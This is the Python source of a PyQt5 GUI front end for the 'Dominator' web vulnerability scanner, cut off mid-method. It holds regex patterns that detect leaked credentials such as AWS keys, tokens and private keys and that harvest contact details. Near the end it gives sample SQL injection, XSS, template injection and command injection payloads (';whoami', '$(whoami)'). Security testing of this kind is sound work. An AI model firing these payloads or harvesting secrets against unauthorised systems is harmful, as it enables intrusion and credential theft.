#!/usr/bin/env python3
"""
Dominator Web Scanner - Modern GUI Interface
Professional dark-themed GUI with real-time progress tracking
"""

import sys
import os
import json
import threading
import subprocess
from datetime import datetime
from pathlib import Path

# Add parent directory to path to import scanner modules
sys.path.insert(0, str(Path(__file__).parent.parent))

try:
    from PyQt5.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QLabel, QLineEdit, QPushButton, QTextEdit, QComboBox, QCheckBox,
        QGroupBox, QGridLayout, QTabWidget, QFileDialog, QSpinBox,
        QProgressBar, QListWidget, QSplitter, QScrollArea, QFrame, QMessageBox,
        QListWidgetItem, QMenuBar, QAction, QMenu, QTableWidget, QTableWidgetItem,
        QHeaderView, QAbstractItemView
    )
    from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QUrl
    from PyQt5.QtGui import QFont, QColor, QPalette, QIcon, QTextCursor, QDesktopServices
except ImportError:
    print("ERROR: PyQt5 is required for the GUI")
    print("Install with: pip install PyQt5")
    sys.exit(1)


class ScanThread(QThread):
    """Background thread for running scans"""
    output_signal = pyqtSignal(str)
    finished_signal = pyqtSignal(int)
    progress_signal = pyqtSignal(int, str)
    vulnerability_signal = pyqtSignal(str, str)  # (severity, description)
    stats_signal = pyqtSignal(int, int, int)  # (total, modules_done, modules_total)
    resource_signal = pyqtSignal(str, str, str, str)  # (type, value, extra, source)
    scope_signal = pyqtSignal(str, str, str, str)  # (type, data1, data2, data3)

    def __init__(self, command):
        super().__init__()
        self.command = command
        self.process = None
        self.total_modules = 20  # Total available modules
        self.completed_modules = 0
        self.total_vulns = 0
        self.current_severity = 'MEDIUM'  # Track current severity section

    def run(self):
        """Run the scan command"""
        try:
            # Get parent directory (where main.py and modules/ are)
            parent_dir = Path(__file__).parent.parent

            self.process = subprocess.Popen(
                self.command,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True,
                encoding='utf-8',
                errors='ignore',
                cwd=str(parent_dir)  # Set working directory to scanner root
            )

            for line in iter(self.process.stdout.readline, ''):
                if line:
                    line_clean = line.strip()
                    self.output_signal.emit(line_clean)

                    # Parse different types of output
                    self.parse_scan_output(line_clean)

            self.process.wait()
            self.finished_signal.emit(self.process.returncode)

        except Exception as e:
            self.output_signal.emit(f"ERROR: {str(e)}")
            self.finished_signal.emit(-1)

    def parse_scan_output(self, line):
        """Parse scanner output for progress and findings"""
        # Strip ANSI color codes for easier parsing
        line_clean = line
        if '[' in line and 'm' in line:
            import re
            line_clean = re.sub(r'\x1b\[[0-9;]*m', '', line)

        # Detect resources (emails, phones, social media, leaked keys)
        self.detect_resources(line_clean)

        # Detect scope info (technologies, titles, IPs)
        self.detect_scope_info(line_clean)

        # Track module execution
        if 'Running module:' in line_clean:
            module_name = line_clean.split('Running module:')[-1].strip()
            self.progress_signal.emit(0, f"🔍 Testing: {module_name}")

        # Track module completion
        elif 'Module' in line_clean and 'completed' in line_clean:
            self.completed_modules += 1
            progress = int((self.completed_modules / self.total_modules) * 100)
            self.progress_signal.emit(progress, f"✓ Completed {self.completed_modules}/{self.total_modules} modules")
            self.stats_signal.emit(self.total_vulns, self.completed_modules, self.total_modules)

        # Track crawling progress
        elif 'Crawling:' in line_clean or 'Found page:' in line_clean or 'Form discovered:' in line_clean:
            self.progress_signal.emit(0, "🕷️ Crawling target...")

        # Track target discovery
        elif 'Page discovery complete:' in line_clean:
            try:
                targets = line_clean.split('Page discovery complete:')[-1].strip()
                self.progress_signal.emit(0, f"📍 {targets}")
            except:
                pass

        # Track vulnerabilities found - NEW: detect "✓ Found:" and severity sections
        elif '✓ Found' in line_clean or 'Found:' in line_clean:
            self.total_vulns += 1
            # Try to determine severity from context (will be updated by severity line)
            severity = 'MEDIUM'
            self.vulnerability_signal.emit(severity, line_clean)
            self.stats_signal.emit(self.total_vulns, self.completed_modules, self.total_modules)

        # Detect severity section headers (Critical Severity, High Severity, etc.)
        elif 'Severity (' in line_clean:
            # Extract count from "Critical Severity (5):" format
            try:
                if 'Critical' in line_clean:
                    self.current_severity = 'CRITICAL'
                elif 'High' in line_clean:
                    self.current_severity = 'HIGH'
                elif 'Medium' in line_clean:
                    self.current_severity = 'MEDIUM'
                elif 'Low' in line_clean:
                    self.current_severity = 'LOW'
            except:
                pass

        # Detect vulnerability type lines like "[SQL Injection]"
        elif line_clean.strip().startswith('[') and line_clean.strip().endswith(']'):
            vuln_type = line_clean.strip()
            if hasattr(self, 'current_severity'):
                severity = self.current_severity
            else:
                severity = 'MEDIUM'
            self.vulnerability_signal.emit(severity, vuln_type)

        # Detect "Total vulnerabilities:" summary
        elif 'Total vulnerabilities:' in line_clean:
            try:
                count = int(line_clean.split('Total vulnerabilities:')[-1].strip())
                self.total_vulns = count
                self.stats_signal.emit(self.total_vulns, self.completed_modules, self.total_modules)
            except:
                pass

        # Track scan start
        elif 'Target:' in line_clean and 'http' in line_clean:
            target = line_clean.split('Target:')[-1].strip()
            self.progress_signal.emit(0, f"🎯 Scanning: {target}")

    def detect_resources(self, line):
        """Detect emails, phones, social media, and leaked keys in output"""
        import re

        # Detect emails
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        emails = re.findall(email_pattern, line)
        for email in emails:
            email_type = "Personal" if any(d in email.lower() for d in ['gmail', 'yahoo', 'hotmail', 'outlook']) else "Business"
            self.resource_signal.emit("email", email, email_type, line[:100])

        # Detect phone numbers (international formats)
        phone_patterns = [
            r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}',  # International
            r'\(\d{3}\)\s?\d{3}-\d{4}',  # (123) 456-7890
            r'\d{3}-\d{3}-\d{4}',  # 123-456-7890
        ]
        for pattern in phone_patterns:
            phones = re.findall(pattern, line)
            for phone in phones:
                if len(phone.replace('-', '').replace(' ', '').replace('(', '').replace(')', '').replace('+', '')) >= 10:
                    phone_format = "International" if '+' in phone else "US/Canada"
                    self.resource_signal.emit("phone", phone, phone_format, line[:100])

        # Detect social media links
        social_media_patterns = {
            'Facebook': r'(?:https?://)?(?:www\.)?facebook\.com/[A-Za-z0-9._-]+',
            'Twitter/X': r'(?:https?://)?(?:www\.)?(?:twitter|x)\.com/[A-Za-z0-9._-]+',
            'LinkedIn': r'(?:https?://)?(?:www\.)?linkedin\.com/(?:in|company)/[A-Za-z0-9._-]+',
            'Instagram': r'(?:https?://)?(?:www\.)?instagram\.com/[A-Za-z0-9._-]+',
            'GitHub': r'(?:https?://)?(?:www\.)?github\.com/[A-Za-z0-9._-]+',
            'YouTube': r'(?:https?://)?(?:www\.)?youtube\.com/(?:c|channel|user)/[A-Za-z0-9._-]+',
            'TikTok': r'(?:https?://)?(?:www\.)?tiktok\.com/@[A-Za-z0-9._-]+',
        }
        for platform, pattern in social_media_patterns.items():
            matches = re.findall(pattern, line, re.IGNORECASE)
            for match in matches:
                self.resource_signal.emit("social", match, platform, line[:100])

        # Detect leaked API keys and secrets
        leaked_key_patterns = {
            'AWS Access Key': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Key': r'aws_secret_access_key\s*=\s*[\'"]([A-Za-z0-9/+=]{40})[\'"]',
            'Google API Key': r'AIza[0-9A-Za-z\-_]{35}',
            'GitHub Token': r'gh[ps]_[A-Za-z0-9]{36}',
            'Slack Token': r'xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[A-Za-z0-9]{24}',
            'Stripe API Key': r'sk_live_[0-9a-zA-Z]{24}',
            'PayPal Client ID': r'A[A-Z0-9]{80}',
            'JWT Token': r'eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
            'Private Key': r'-----BEGIN (?:RSA |OPENSSH )?PRIVATE KEY-----',
            'Generic API Key': r'(?i)api[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-]{20,})["\']?',
        }
        for key_type, pattern in leaked_key_patterns.items():
            matches = re.findall(pattern, line)
            for match in matches:
                # Truncate key preview for security
                key_preview = str(match)[:20] + "..." if len(str(match)) > 20 else str(match)
                severity = "CRITICAL" if any(k in key_type for k in ['AWS', 'Private Key', 'Secret']) else "HIGH"
                self.resource_signal.emit("leaked_key", key_preview, f"{key_type}|{severity}", line[:100])

    def detect_scope_info(self, line):
        """Detect technologies, page titles, and IP information"""
        import re

        # Detect technologies from headers/responses
        tech_patterns = {
            'PHP': r'(?:X-Powered-By|Server).*PHP/([0-9.]+)',
            'Apache': r'Server.*Apache/([0-9.]+)',
            'Nginx': r'Server.*nginx/([0-9.]+)',
            'WordPress': r'(?:wp-content|wp-includes|WordPress/([0-9.]+))',
            'jQuery': r'jquery[.-]([0-9.]+)\.(?:min\.)?js',
            'React': r'react(?:-dom)?[.-]([0-9.]+)\.(?:min\.)?js',
            'Vue.js': r'vue[.-]([0-9.]+)\.(?:min\.)?js',
            'Angular': r'angular[.-]([0-9.]+)\.(?:min\.)?js',
            'Bootstrap': r'bootstrap[.-]([0-9.]+)\.(?:min\.)?(?:css|js)',
            'MySQL': r'MySQL/([0-9.]+)',
            'PostgreSQL': r'PostgreSQL/([0-9.]+)',
            'IIS': r'Server.*IIS/([0-9.]+)',
            'ASP.NET': r'X-AspNet-Version.*([0-9.]+)',
        }

        for tech_name, pattern in tech_patterns.items():
            matches = re.findall(pattern, line, re.IGNORECASE)
            for version in matches:
                category = self._get_tech_category(tech_name)
                self.scope_signal.emit("technology", tech_name, version, f"{category}|{line[:80]}")

        # Detect page titles
        title_pattern = r'<title>([^<]+)</title>'
        titles = re.findall(title_pattern, line, re.IGNORECASE)
        for title in titles:
            # Extract URL from line if present
            url_match = re.search(r'https?://[^\s]+', line)
            url = url_match.group(0) if url_match else "Unknown"
            self.scope_signal.emit("title", title.strip(), url, "")

        # Detect IP addresses and potential geo info
        ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
        ips = re.findall(ip_pattern, line)
        for ip in ips:
            # Skip private IPs
            if not (ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.') or ip.startswith('127.')):
                # Extract domain from line if present
                domain_match = re.search(r'(?:https?://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', line)
                domain = domain_match.group(1) if domain_match else ""
                self.scope_signal.emit("ip", ip, domain, line[:80])

    def _get_tech_category(self, tech_name):
        """Categorize technology"""
        categories = {
            'PHP': 'Language',
            'ASP.NET': 'Framework',
            'Apache': 'Web Server',
            'Nginx': 'Web Server',
            'IIS': 'Web Server',
            'WordPress': 'CMS',
            'jQuery': 'JavaScript Library',
            'React': 'Frontend Framework',
            'Vue.js': 'Frontend Framework',
            'Angular': 'Frontend Framework',
            'Bootstrap': 'CSS Framework',
            'MySQL': 'Database',
            'PostgreSQL': 'Database',
        }
        return categories.get(tech_name, 'Other')

    def stop(self):
        """Stop the running scan"""
        if self.process:
            self.process.terminate()


class DominatorGUI(QMainWindow):
    """Main GUI window for Dominator scanner"""

    def __init__(self):
        super().__init__()
        self.scan_thread = None
        self.vuln_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        self.init_ui()
        self.apply_dark_theme()

    def init_ui(self):
        """Initialize the user interface"""
        self.setWindowTitle("Dominator Web Vulnerability Scanner")
        self.setGeometry(100, 100, 1400, 900)

        # Create menu bar
        self.create_menu_bar()

        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        main_layout.setSpacing(10)
        main_layout.setContentsMargins(15, 15, 15, 15)

        # Header
        header = self.create_header()
        main_layout.addWidget(header)

        # Tab widget for different sections
        self.tabs = QTabWidget()
        self.tabs.setStyleSheet("QTabWidget::pane { border: 1px solid #3a3a3a; }")

        # Scan Configuration Tab
        scan_tab = self.create_scan_tab()
        self.tabs.addTab(scan_tab, "Scan Configuration")

        # Advanced Options Tab
        advanced_tab = self.create_advanced_tab()
        self.tabs.addTab(advanced_tab, "Advanced Options")

        # Custom Payloads Tab
        payloads_tab = self.create_payloads_tab()
        self.tabs.addTab(payloads_tab, "Custom Payloads")

        # Output Tab
        output_tab = self.create_output_tab()
        self.tabs.addTab(output_tab, "Scan Output")

        # Results Tab
        results_tab = self.create_results_tab()
        self.tabs.addTab(results_tab, "Results")

        # Resources Tab
        resources_tab = self.create_resources_tab()
        self.tabs.addTab(resources_tab, "Resources")

        # Scope Tab
        scope_tab = self.create_scope_tab()
        self.tabs.addTab(scope_tab, "Scope")

        main_layout.addWidget(self.tabs)

        # Status bar
        self.statusBar().showMessage("Ready to scan")
        self.statusBar().setStyleSheet("background-color: #2b2b2b; color: #00ff00; padding: 5px;")

    def create_menu_bar(self):
        """Create menu bar"""
        menubar = self.menuBar()
        menubar.setStyleSheet("""
            QMenuBar {
                background-color: #2a2a2a;
                color: white;
                padding: 4px;
            }
            QMenuBar::item {
                background-color: transparent;
                padding: 6px 12px;
            }
            QMenuBar::item:selected {
                background-color: #00ff88;
                color: black;
            }
            QMenu {
                background-color: #2a2a2a;
                color: white;
                border: 1px solid #3a3a3a;
            }
            QMenu::item {
                padding: 6px 30px 6px 20px;
            }
            QMenu::item:selected {
                background-color: #00ff88;
                color: black;
            }
        """)

        # File menu
        file_menu = menubar.addMenu("📁 File")

        new_scan_action = QAction("🆕 New Scan", self)
        new_scan_action.setShortcut("Ctrl+N")
        new_scan_action.triggered.connect(self.new_scan)
        file_menu.addAction(new_scan_action)

        load_config_action = QAction("📂 Load Configuration", self)
        load_config_action.setShortcut("Ctrl+O")
        load_config_action.triggered.connect(self.load_configuration)
        file_menu.addAction(load_config_action)

        save_config_action = QAction("💾 Save Configuration", self)
        save_config_action.setShortcut("Ctrl+S")
        save_config_action.triggered.connect(self.save_configuration)
        file_menu.addAction(save_config_action)

        file_menu.addSeparator()

        export_results_action = QAction("📤 Export Results", self)
        export_results_action.triggered.connect(self.export_results)
        file_menu.addAction(export_results_action)

        file_menu.addSeparator()

        exit_action = QAction("🚪 Exit", self)
        exit_action.setShortcut("Ctrl+Q")
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)

        # Edit menu
        edit_menu = menubar.addMenu("✏️ Edit")

        clear_targets_action = QAction("🗑️ Clear Targets", self)
        clear_targets_action.triggered.connect(self.clear_targets)
        edit_menu.addAction(clear_targets_action)

        clear_output_action = QAction("🧹 Clear Output", self)
        clear_output_action.triggered.connect(lambda: self.output_console.clear())
        edit_menu.addAction(clear_output_action)

        clear_results_action = QAction("🔄 Clear Results", self)
        clear_results_action.triggered.connect(self.clear_results)
        edit_menu.addAction(clear_results_action)

        # View menu
        view_menu = menubar.addMenu("👁️ View")

        view_scan_tab_action = QAction("Scan Configuration", self)
        view_scan_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(0))
        view_menu.addAction(view_scan_tab_action)

        view_advanced_tab_action = QAction("Advanced Options", self)
        view_advanced_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(1))
        view_menu.addAction(view_advanced_tab_action)

        view_payloads_tab_action = QAction("Custom Payloads", self)
        view_payloads_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(2))
        view_menu.addAction(view_payloads_tab_action)

        view_output_tab_action = QAction("Scan Output", self)
        view_output_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(3))
        view_menu.addAction(view_output_tab_action)

        view_results_tab_action = QAction("Results", self)
        view_results_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(4))
        view_menu.addAction(view_results_tab_action)

        view_resources_tab_action = QAction("Resources", self)
        view_resources_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(5))
        view_menu.addAction(view_resources_tab_action)

        view_scope_tab_action = QAction("Scope", self)
        view_scope_tab_action.triggered.connect(lambda: self.tabs.setCurrentIndex(6))
        view_menu.addAction(view_scope_tab_action)

        # Help menu
        help_menu = menubar.addMenu("❓ Help")

        docs_action = QAction("📖 Documentation", self)
        docs_action.triggered.connect(lambda: QDesktopServices.openUrl(QUrl("https://github.com/vulnz/dominator")))
        help_menu.addAction(docs_action)

        help_menu.addSeparator()

        about_action = QAction("ℹ️ About Dominator", self)
        about_action.triggered.connect(self.show_about)
        help_menu.addAction(about_action)

    def create_header(self):
        """Create header section"""
        header = QFrame()
        header.setFrameShape(QFrame.StyledPanel)
        header.setStyleSheet("""
            QFrame {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #1a1a2e, stop:0.5 #16213e, stop:1 #0f3460);
                border-radius: 8px;
                padding: 15px;
            }
        """)

        layout = QVBoxLayout(header)

        title = QLabel("DOMINATOR")
        title.setFont(QFont("Arial", 28, QFont.Bold))
        title.setStyleSheet("color: #00ff88; background: transparent;")
        layout.addWidget(title)

        subtitle = QLabel("Advanced Web Vulnerability Scanner | 20 Modules | OWASP Top 10")
        subtitle.setFont(QFont("Arial", 11))
        subtitle.setStyleSheet("color: #888888; background: transparent;")
        layout.addWidget(subtitle)

        return header

    def create_scan_tab(self):
        """Create scan configuration tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Target Configuration
        target_group = QGroupBox("Target Configuration")
        target_layout = QGridLayout()

        # Target (supports URLs, domains, IPs, CIDR, ranges)
        target_layout.addWidget(QLabel("Target:"), 0, 0)
        self.target_input = QTextEdit()
        self.target_input.setPlaceholderText(
            "Enter targets (one per line). Supported formats:\n"
            "• URLs: http://example.com, https://example.com:8080/path\n"
            "• Domains: example.com, subdomain.example.com\n"
            "• IP addresses: 192.168.1.1, 10.0.0.5\n"
            "• CIDR ranges: 192.168.1.0/24\n"
            "• IP ranges: 192.168.1.1-192.168.1.50\n\n"
            "Mix and match different formats!"
        )
        self.target_input.setMaximumHeight(120)
        self.target_input.setStyleSheet("""
            QTextEdit {
                background-color: #2a2a2a;
                color: white;
                border: 2px solid #3a3a3a;
                border-radius: 4px;
                padding: 6px;
                font-family: 'Consolas', 'Courier New', monospace;
            }
        """)
        target_layout.addWidget(self.target_input, 0, 1, 1, 2)

        # Target File
        target_layout.addWidget(QLabel("Or Target File:"), 1, 0)
        self.target_file_input = QLineEdit()
        self.target_file_input.setPlaceholderText("Path to file with targets (one per line - all formats supported)")
        target_layout.addWidget(self.target_file_input, 1, 1)

        browse_btn = QPushButton("Browse...")
        browse_btn.clicked.connect(self.browse_target_file)
        target_layout.addWidget(browse_btn, 1, 2)

        target_group.setLayout(target_layout)
        layout.addWidget(target_group)

        # Module Selection
        module_group = QGroupBox("🔧 Module Selection")
        module_layout = QVBoxLayout()

        # All modules checkbox
        all_modules_layout = QHBoxLayout()
        self.all_modules_cb = QCheckBox("All Modules (20)")
        self.all_modules_cb.setChecked(True)
        self.all_modules_cb.toggled.connect(self.toggle_module_selection)
        all_modules_layout.addWidget(self.all_modules_cb)
        all_modules_layout.addStretch()
        module_layout.addLayout(all_modules_layout)

        # Module grid
        self.module_checkboxes = {}
        module_grid = QGridLayout()
        modules = [
            "sqli", "xss", "csrf", "lfi", "rfi", "xxe",
            "cmdi", "ssti", "xpath", "idor", "ssrf", "redirect",
            "dom_xss", "file_upload", "weak_credentials", "dirbrute",
            "git", "env_secrets", "php_object_injection"
        ]

        row, col = 0, 0
        for module in modules:
            cb = QCheckBox(module.upper())
            cb.setEnabled(False)  # Disabled when "All" is checked
            self.module_checkboxes[module] = cb
            module_grid.addWidget(cb, row, col)
            col += 1
            if col > 3:
                col = 0
                row += 1

        module_layout.addLayout(module_grid)
        module_group.setLayout(module_layout)
        layout.addWidget(module_group)

        # Scan Settings
        settings_group = QGroupBox("⚙️ Scan Settings")
        settings_layout = QGridLayout()

        # Threads
        settings_layout.addWidget(QLabel("Threads:"), 0, 0)
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 50)
        self.threads_spin.setValue(10)
        settings_layout.addWidget(self.threads_spin, 0, 1)

        # Timeout
        settings_layout.addWidget(QLabel("Timeout (seconds):"), 0, 2)
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(5, 300)
        self.timeout_spin.setValue(15)
        settings_layout.addWidget(self.timeout_spin, 0, 3)

        # Max time
        settings_layout.addWidget(QLabel("Max Scan Time (minutes):"), 1, 0)
        self.max_time_spin = QSpinBox()
        self.max_time_spin.setRange(1, 300)
        self.max_time_spin.setValue(45)
        settings_layout.addWidget(self.max_time_spin, 1, 1)

        # Output format
        settings_layout.addWidget(QLabel("Output Format:"), 1, 2)
        self.format_combo = QComboBox()
        self.format_combo.addItems(["html", "json", "txt", "html,json,txt"])
        self.format_combo.setCurrentText("html,json,txt")
        settings_layout.addWidget(self.format_combo, 1, 3)

        settings_group.setLayout(settings_layout)
        layout.addWidget(settings_group)

        # Control Buttons
        button_layout = QHBoxLayout()

        self.start_btn = QPushButton("🚀 START SCAN")
        self.start_btn.setStyleSheet("""
            QPushButton {
                background-color: #00ff88;
                color: #000000;
                font-size: 16px;
                font-weight: bold;
                padding: 12px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background-color: #00cc70;
            }
            QPushButton:disabled {
                background-color: #555555;
                color: #888888;
            }
        """)
        self.start_btn.clicked.connect(self.start_scan)
        button_layout.addWidget(self.start_btn)

        self.stop_btn = QPushButton("⏹️ STOP SCAN")
        self.stop_btn.setEnabled(False)
        self.stop_btn.setStyleSheet("""
            QPushButton {
                background-color: #ff4444;
                color: #ffffff;
                font-size: 16px;
                font-weight: bold;
                padding: 12px;
                border-radius: 6px;
            }
            QPushButton:hover {
                background-color: #cc0000;
            }
            QPushButton:disabled {
                background-color: #555555;
                color: #888888;
            }
        """)
        self.stop_btn.clicked.connect(self.stop_scan)
        button_layout.addWidget(self.stop_btn)

        layout.addLayout(button_layout)
        layout.addStretch()

        return widget

    def create_advanced_tab(self):
        """Create advanced options tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # ROTATION 9 Features
        rotation9_group = QGroupBox("🔥 ROTATION 9 Features")
        rotation9_layout = QGridLayout()

        self.recon_only_cb = QCheckBox("Recon Only Mode (Passive scanning only)")
        rotation9_layout.addWidget(self.recon_only_cb, 0, 0, 1, 2)

        self.rotate_agent_cb = QCheckBox("Rotate User-Agent (26 modern browsers)")
        rotation9_layout.addWidget(self.rotate_agent_cb, 1, 0, 1, 2)

        self.single_page_cb = QCheckBox("Single Page Mode (No crawling)")
        rotation9_layout.addWidget(self.single_page_cb, 2, 0, 1, 2)

        rotation9_group.setLayout(rotation9_layout)
        layout.addWidget(rotation9_group)

        # Authentication
        auth_group = QGroupBox("🔐 Authentication")
        auth_layout = QGridLayout()

        auth_layout.addWidget(QLabel("Auth Type:"), 0, 0)
        self.auth_type_combo = QComboBox()
        self.auth_type_combo.addItems([
            "None",
            "Basic Auth",
            "Digest Auth",
            "NTLM Auth",
            "Bearer Token",
            "API Key",
            "OAuth 2.0",
            "Custom Header"
        ])
        self.auth_type_combo.currentTextChanged.connect(self.on_auth_type_changed)
        auth_layout.addWidget(self.auth_type_combo, 0, 1, 1, 3)

        # Username (for Basic, Digest, NTLM)
        auth_layout.addWidget(QLabel("Username:"), 1, 0)
        self.auth_username = QLineEdit()
        self.auth_username.setPlaceholderText("Username for authentication")
        self.auth_username.setEnabled(False)
        auth_layout.addWidget(self.auth_username, 1, 1, 1, 3)

        # Password (for Basic, Digest, NTLM)
        auth_layout.addWidget(QLabel("Password:"), 2, 0)
        self.auth_password = QLineEdit()
        self.auth_password.setPlaceholderText("Password for authentication")
        self.auth_password.setEchoMode(QLineEdit.Password)
        self.auth_password.setEnabled(False)
        auth_layout.addWidget(self.auth_password, 2, 1, 1, 3)

        # Token/API Key (for Bearer, API Key, OAuth)
        auth_layout.addWidget(QLabel("Token/Key:"), 3, 0)
        self.auth_token = QLineEdit()
        self.auth_token.setPlaceholderText("Bearer token, API key, or OAuth token")
        self.auth_token.setEnabled(False)
        auth_layout.addWidget(self.auth_token, 3, 1, 1, 3)

        # Custom header name (for API Key, Custom Header)
        auth_layout.addWidget(QLabel("Header Name:"), 4, 0)
        self.auth_header_name = QLineEdit()
        self.auth_header_name.setPlaceholderText("e.g., X-API-Key, Authorization")
        self.auth_header_name.setEnabled(False)
        auth_layout.addWidget(self.auth_header_name, 4, 1, 1, 3)

        auth_group.setLayout(auth_layout)
        layout.addWidget(auth_group)

        # HTTP Configuration
        http_group = QGroupBox("🌐 HTTP Configuration")
        http_layout = QGridLayout()

        http_layout.addWidget(QLabel("Custom Headers:"), 0, 0)
        self.headers_input = QTextEdit()
        self.headers_input.setPlaceholderText("Header1: Value1\nHeader2: Value2")
        self.headers_input.setMaximumHeight(80)
        http_layout.addWidget(self.headers_input, 0, 1)

        http_layout.addWidget(QLabel("Cookies:"), 1, 0)
        self.cookies_input = QLineEdit()
        self.cookies_input.setPlaceholderText("session=abc123; token=xyz")
        http_layout.addWidget(self.cookies_input, 1, 1)

        http_group.setLayout(http_layout)
        layout.addWidget(http_group)

        # Crawler Settings
        crawler_group = QGroupBox("🕷️ Crawler Settings")
        crawler_layout = QGridLayout()

        crawler_layout.addWidget(QLabel("Max Crawl Pages:"), 0, 0)
        self.max_crawl_spin = QSpinBox()
        self.max_crawl_spin.setRange(1, 1000)
        self.max_crawl_spin.setValue(100)
        crawler_layout.addWidget(self.max_crawl_spin, 0, 1)

        crawler_layout.addWidget(QLabel("Payload Limit:"), 0, 2)
        self.payload_limit_spin = QSpinBox()
        self.payload_limit_spin.setRange(1, 100)
        self.payload_limit_spin.setValue(50)
        crawler_layout.addWidget(self.payload_limit_spin, 0, 3)

        # Forbidden Paths
        crawler_layout.addWidget(QLabel("Forbidden Paths:"), 1, 0)
        self.forbidden_paths_input = QLineEdit()
        self.forbidden_paths_input.setPlaceholderText("/logout,/delete,/admin/critical (comma-separated)")
        self.forbidden_paths_input.setToolTip("URLs/paths that should NOT be crawled or tested")
        crawler_layout.addWidget(self.forbidden_paths_input, 1, 1, 1, 3)

        crawler_group.setLayout(crawler_layout)
        layout.addWidget(crawler_group)

        layout.addStretch()
        return widget

    def create_payloads_tab(self):
        """Create custom payloads tab"""
        widget = QWidget()
        layout = QVBoxLayout(widget)

        # Instructions
        info_label = QLabel("💡 Provide custom payloads to override default payloads for specific modules. Select target module(s) below.")
        info_label.setStyleSheet("color: #00ff88; padding: 10px; background-color: #2a2a2a; border-radius: 5px;")
        info_label.setWordWrap(True)
        layout.addWidget(info_label)

        # Module Selection for Custom Payloads
        module_select_group = QGroupBox("🎯 Target Module(s)")
        module_select_layout = QVBoxLayout()

        module_help = QLabel("Select which module(s) should use these custom payloads:")
        module_help.setStyleSheet("color: #888888; font-size: 10px;")
        module_select_layout.addWidget(module_help)

        # Module selector dropdown
        module_selector_layout = QHBoxLayout()
        module_selector_layout.addWidget(QLabel("Apply payloads to:"))

        self.payload_target_module = QComboBox()
        self.payload_target_module.addItems([
            "All Modules",
            "SQL Injection (sqli)",
            "Cross-Site Scripting (xss)",
            "Server-Side Template Injection (ssti)",
            "Command Injection (cmdi)",
            "LDAP Injection (ldap)",
            "XPath Injection (xpath)",
            "Local File Inclusion (lfi)",
            "Remote File Inclusion (rfi)",
            "XML External Entity (xxe)",
            "Server-Side Request Forgery (ssrf)",
            "PHP Object Injection (php_object_injection)"
        ])
        self.payload_target_module.setStyleSheet("""
            QComboBox {
                background-color: #2a2a2a;
                color: white;
                border: 2px solid #3a3a3a;
                border-radius: 4px;
                padding: 6px;
                min-width: 300px;
            }
            QComboBox::drop-down {
                border: none;
                background-color: #3a3a3a;
            }
            QComboBox::down-arrow {
                image: none;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 5px solid white;
            }
            QComboBox QAbstractItemView {
                background-color: #2a2a2a;
                color: white;
                selection-background-color: #00ff88;
                selection-color: black;
            }
        """)
        module_selector_layout.addWidget(self.payload_target_module)
        module_selector_layout.addStretch()

        module_select_layout.addLayout(module_selector_layout)
        module_select_group.setLayout(module_select_layout)
        layout.addWidget(module_select_group)

        # Custom Payloads File
        file_group = QGroupBox("📁 Load Payloads from File")
        file_layout = QGridLayout()

        file_layout.addWidget(QLabel("Payloads File:"), 0, 0)
        self.custom_payloads_file = QLineEdit()
        self.custom_payloads_file.setPlaceholderText("Path to file with custom payloads (one per line)")
        file_layout.addWidget(self.custom_payloads_file, 0, 1)

        browse_payloads_btn = QPushButton("Browse...")
        browse_payloads_btn.clicked.connect(self.browse_payloads_file)
        file_layout.addWidget(browse_payloads_btn, 0, 2)

        file_group.setLayout(file_layout)
        layout.addWidget(file_group)

        # Direct Payload Entry
        direct_group = QGroupBox("✍️ Enter Payloads Directly")
        direct_layout = QVBoxLayout()

        help_text = QLabel("Enter custom payloads below (one per line). These will ONLY be used by the selected module above.")
        help_text.setStyleSheet("color: #888888; font-size: 10px;")
        help_text.setWordWrap(True)
        direct_layout.addWidget(help_text)

        # Dynamic help based on selected module
        self.payload_example_label = QLabel()
        self.payload_example_label.setStyleSheet("color: #00ff88; font-size: 10px; padding: 5px; background-color: #1a1a1a; border-radius: 3px;")
        self.payload_example_label.setWordWrap(True)
        direct_layout.addWidget(self.payload_example_label)

        # Connect to update examples when module changes
        self.payload_target_module.currentTextChanged.connect(self.update_payload_examples)

        self.custom_payloads_text = QTextEdit()
        self.custom_payloads_text.setPlaceholderText(
            "Select a target module above to see example payloads...\n\n"
            "Your custom payloads will be used INSTEAD of the default payloads\n"
            "for the selected module during the scan.\n\n"
            "Examples:\n"
            "• SQL Injection: ' OR 1=1--, admin' --\n"
            "• XSS: <script>alert(1)</script>, <img src=x onerror=alert(1)>\n"
            "• SSTI: {{7*7}}, ${7*7}, {{config}}\n"
            "• Command Injection: ;whoami, `whoami`, $(whoami)"
        )
